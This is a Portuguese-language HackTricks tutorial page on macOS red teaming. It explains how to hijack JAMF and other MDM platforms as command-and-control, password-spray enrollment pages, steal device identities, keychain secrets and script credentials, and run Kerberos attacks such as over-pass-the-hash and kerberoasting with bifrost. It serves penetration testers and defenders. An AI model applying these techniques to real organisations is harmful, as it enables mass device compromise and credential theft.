# macOS Red Teaming

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

#### Obtenha a perspectiva de um hacker sobre seus aplicativos web, rede e nuvem

**Encontre e relate vulnerabilidades críticas e exploráveis com impacto real nos negócios.** Use nossas 20+ ferramentas personalizadas para mapear a superfície de ataque, encontrar problemas de segurança que permitem escalar privilégios e usar exploits automatizados para coletar evidências essenciais, transformando seu trabalho árduo em relatórios persuasivos.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## Abusando de MDMs

* JAMF Pro: `jamf checkJSSConnection`
* Kandji

Se você conseguir **comprometer credenciais de administrador** para acessar a plataforma de gerenciamento, você pode **potencialmente comprometer todos os computadores** distribuindo seu malware nas máquinas.

Para red teaming em ambientes MacOS, é altamente recomendável ter algum entendimento de como os MDMs funcionam:

{% content-ref url="macos-mdm/" %}
[macos-mdm](macos-mdm/)
{% endcontent-ref %}

### Usando MDM como um C2

Um MDM terá permissão para instalar, consultar ou remover perfis, instalar aplicativos, criar contas de administrador locais, definir senha de firmware, mudar a chave do FileVault...

Para executar seu próprio MDM, você precisa de **seu CSR assinado por um fornecedor** que você poderia tentar obter com [**https://mdmcert.download/**](https://mdmcert.download/). E para executar seu próprio MDM para dispositivos Apple, você poderia usar [**MicroMDM**](https://github.com/micromdm/micromdm).

No entanto, para instalar um aplicativo em um dispositivo inscrito, você ainda precisa que ele seja assinado por uma conta de desenvolvedor... no entanto, após a inscrição no MDM, o **dispositivo adiciona o certificado SSL do MDM como uma CA confiável**, então você pode agora assinar qualquer coisa.

Para inscrever o dispositivo em um MDM, você precisa instalar um **`mobileconfig`** como root, que pode ser entregue via um **pkg** (você pode compactá-lo em zip e, quando baixado do safari, ele será descompactado).

**O agente Mythic Orthrus** usa essa técnica.

### Abusando do JAMF PRO

O JAMF pode executar **scripts personalizados** (scripts desenvolvidos pelo sysadmin), **payloads nativos** (criação de conta local, definir senha EFI, monitoramento de arquivos/processos...) e **MDM** (configurações de dispositivo, certificados de dispositivo...).

#### Auto-inscrição do JAMF

Vá para uma página como `https://<nome-da-empresa>.jamfcloud.com/enroll/` para ver se eles têm **auto-inscrição habilitada**. Se tiver, pode **pedir credenciais para acessar**.

Você poderia usar o script [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) para realizar um ataque de password spraying.

Além disso, após encontrar credenciais adequadas, você poderia ser capaz de forçar outros nomes de usuário com o próximo formulário:

![](<../../.gitbook/assets/image (107).png>)

#### Autenticação de Dispositivo JAMF

<figure><img src="../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

O **binário `jamf`** continha o segredo para abrir o keychain que, no momento da descoberta, era **compartilhado** entre todos e era: **`jk23ucnq91jfu9aj`**.\
Além disso, o jamf **persiste** como um **LaunchDaemon** em **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### Tomada de Controle de Dispositivo JAMF

A **URL** do **JSS** (Jamf Software Server) que **`jamf`** usará está localizada em **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Este arquivo basicamente contém a URL:

{% code overflow="wrap" %}
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://halbornasd.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
{% endcode %}

Assim, um atacante poderia instalar um pacote malicioso (`pkg`) que **substitui este arquivo** ao ser instalado, configurando a **URL para um listener Mythic C2 de um agente Typhon** para agora poder abusar do JAMF como C2.

{% code overflow="wrap" %}
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
{% endcode %}

#### Impersonação do JAMF

Para **impersonar a comunicação** entre um dispositivo e o JMF, você precisa:

* O **UUID** do dispositivo: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
* O **keychain do JAMF** de: `/Library/Application\ Support/Jamf/JAMF.keychain`, que contém o certificado do dispositivo

Com essas informações, **crie uma VM** com o **UUID** de Hardware **roubado** e com **SIP desativado**, coloque o **keychain do JAMF,** **hook** o **agente** Jamf e roube suas informações.

#### Roubo de segredos

<figure><img src="../../.gitbook/assets/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Você também pode monitorar a localização `/Library/Application Support/Jamf/tmp/` para os **scripts personalizados** que os administradores podem querer executar via Jamf, pois eles são **colocados aqui, executados e removidos**. Esses scripts **podem conter credenciais**.

No entanto, **credenciais** podem ser passadas para esses scripts como **parâmetros**, então você precisaria monitorar `ps aux | grep -i jamf` (sem nem mesmo ser root).

O script [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) pode escutar por novos arquivos sendo adicionados e novos argumentos de processo.

### Acesso Remoto ao macOS

E também sobre os **protocolos** **de rede** "especiais" do **MacOS**:

{% content-ref url="../macos-security-and-privilege-escalation/macos-protocols.md" %}
[macos-protocols.md](../macos-security-and-privilege-escalation/macos-protocols.md)
{% endcontent-ref %}

## Active Directory

Em algumas ocasiões, você encontrará que o **computador MacOS está conectado a um AD**. Nesse cenário, você deve tentar **enumerar** o diretório ativo como está acostumado. Encontre alguma **ajuda** nas seguintes páginas:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/active-directory-methodology/" %}
[active-directory-methodology](../../windows-hardening/active-directory-methodology/)
{% endcontent-ref %}

{% content-ref url="../../network-services-pentesting/pentesting-kerberos-88/" %}
[pentesting-kerberos-88](../../network-services-pentesting/pentesting-kerberos-88/)
{% endcontent-ref %}

Alguma **ferramenta local do MacOS** que também pode ajudar é `dscl`:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Também existem algumas ferramentas preparadas para MacOS para enumerar automaticamente o AD e interagir com o kerberos:

* [**Machound**](https://github.com/XMCyber/MacHound): MacHound é uma extensão da ferramenta de auditoria Bloodhound que permite coletar e ingerir relacionamentos do Active Directory em hosts MacOS.
* [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost é um projeto em Objective-C projetado para interagir com as APIs Heimdal krb5 no macOS. O objetivo do projeto é permitir testes de segurança melhores em torno do Kerberos em dispositivos macOS usando APIs nativas, sem exigir nenhum outro framework ou pacotes no alvo.
* [**Orchard**](https://github.com/its-a-feature/Orchard): Ferramenta JavaScript para Automação (JXA) para fazer enumeração do Active Directory.

### Informações do Domínio
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Usuários

Os três tipos de usuários do MacOS são:

* **Usuários Locais** — Gerenciados pelo serviço OpenDirectory local, não estão conectados de nenhuma forma ao Active Directory.
* **Usuários de Rede** — Usuários voláteis do Active Directory que requerem uma conexão com o servidor DC para autenticar.
* **Usuários Móveis** — Usuários do Active Directory com um backup local para suas credenciais e arquivos.

As informações locais sobre usuários e grupos são armazenadas na pasta _/var/db/dslocal/nodes/Default._\
Por exemplo, as informações sobre o usuário chamado _mark_ estão armazenadas em _/var/db/dslocal/nodes/Default/users/mark.plist_ e as informações sobre o grupo _admin_ estão em _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Além de usar as arestas HasSession e AdminTo, **MacHound adiciona três novas arestas** ao banco de dados Bloodhound:

* **CanSSH** - entidade permitida para SSH no host
* **CanVNC** - entidade permitida para VNC no host
* **CanAE** - entidade permitida para executar scripts AppleEvent no host
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Mais informações em [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Computer$ senha

Obtenha senhas usando:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
É possível acessar a senha **`Computer$`** dentro do chaveiro do Sistema.

### Over-Pass-The-Hash

Obtenha um TGT para um usuário e serviço específicos:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Uma vez que o TGT é coletado, é possível injetá-lo na sessão atual com:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Com os tickets de serviço obtidos, é possível tentar acessar compartilhamentos em outros computadores:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Acessando o Keychain

O Keychain provavelmente contém informações sensíveis que, se acessadas sem gerar um prompt, poderiam ajudar a avançar em um exercício de red team:

{% content-ref url="macos-keychain.md" %}
[macos-keychain.md](macos-keychain.md)
{% endcontent-ref %}

## Serviços Externos

O Red Teaming no MacOS é diferente do Red Teaming regular no Windows, pois geralmente **o MacOS está integrado com várias plataformas externas diretamente**. Uma configuração comum do MacOS é acessar o computador usando **credenciais sincronizadas do OneLogin e acessar vários serviços externos** (como github, aws...) via OneLogin.

## Técnicas Diversas de Red Team

### Safari

Quando um arquivo é baixado no Safari, se for um arquivo "seguro", ele será **aberto automaticamente**. Por exemplo, se você **baixar um zip**, ele será automaticamente descompactado:

<figure><img src="../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

## Referências

* [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
* [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
* [**https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0**](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
* [**Come to the Dark Side, We Have Apples: Turning macOS Management Evil**](https://www.youtube.com/watch?v=pOQOh07eMxY)
* [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

#### Obtenha a perspectiva de um hacker sobre seus aplicativos web, rede e nuvem

**Encontre e relate vulnerabilidades críticas e exploráveis com impacto real nos negócios.** Use nossas mais de 20 ferramentas personalizadas para mapear a superfície de ataque, encontrar problemas de segurança que permitem escalar privilégios e usar exploits automatizados para coletar evidências essenciais, transformando seu trabalho árduo em relatórios persuasivos.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
